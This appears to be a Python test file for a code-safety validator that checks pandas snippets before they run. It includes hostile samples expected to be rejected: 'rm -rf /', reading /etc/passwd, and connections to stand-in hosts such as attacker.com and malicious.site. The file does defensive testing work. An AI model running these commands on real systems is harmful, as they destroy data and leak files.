import os
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from utils.python_guard import PythonGuard

guard = PythonGuard()

test_cases = [
    # Safe Pandas transformations
    (
        """
import pandas as pd

df = pd.read_csv(INPUT_DIR / "extracted_data.csv")
df = df.drop_duplicates()
df["name"] = df["name"].astype(str).str.strip()
df.to_csv(OUTPUT_DIR / "transformed_data.csv", index=False)
        """,
        True,
    ),
    (
        """
import pandas as pd
import pyarrow as pa

df = pd.read_json(INPUT_DIR / "data.json")
df_filtered = df[df['status'] == 'active']
df_filtered.to_parquet(OUTPUT_DIR / "cleaned_data.parquet")
        """,
        True,
    ),

    # Forbidden OS / Subprocess imports
    (
        """
import os
os.system("rm -rf /")
        """,
        False,
    ),
    (
        """
from subprocess import run, Popen
run(["cat", "/etc/passwd"])
        """,
        False,
    ),
    (
        """
import socket
s = socket.socket()
s.connect(("attacker.com", 80))
        """,
        False,
    ),
    (
        """
import shutil
shutil.rmtree("/workspace")
        """,
        False,
    ),
    (
        """
import requests
requests.get("https://malicious.site/leak")
        """,
        False,
    ),

    # Forbidden builtin calls
    (
        """
import pandas as pd
exec("print('dangerous exec')")
        """,
        False,
    ),
    (
        """
import pandas as pd
eval("__import__('os').system('ls')")
        """,
        False,
    ),
    (
        """
code = compile("1 + 1", "", "eval")
        """,
        False,
    ),

    # Empty and Syntax Error cases
    (
        "",
        False,
    ),
    (
        "invalid python code ::: (())",
        False,
    ),
]


def test_python_guard():
    passed = 0
    failed = 0

    print("================ Running PythonGuard Tests ================")
    for code, expected in test_cases:
        result = guard.validate(code)
        status = "PASSED" if result.is_safe == expected else "FAILED"
        if result.is_safe == expected:
            passed += 1
        else:
            failed += 1

        first_line = code.strip().splitlines()[0] if code.strip() else "<empty>"
        print(f"[{status}] Expected Safe: {expected} | Actual Safe: {result.is_safe}")
        print(f"       Code Snippet: {first_line[:60]}")
        print(f"       Reason: {result.reason}\n")

        assert result.is_safe == expected, f"Expected {expected}, got {result.is_safe} for code: {code}"

    print(f"Total: {len(test_cases)} | Passed: {passed} | Failed: {failed}")
    print("================ All PythonGuard Tests Passed! ================\n")


if __name__ == "__main__":
    test_python_guard()
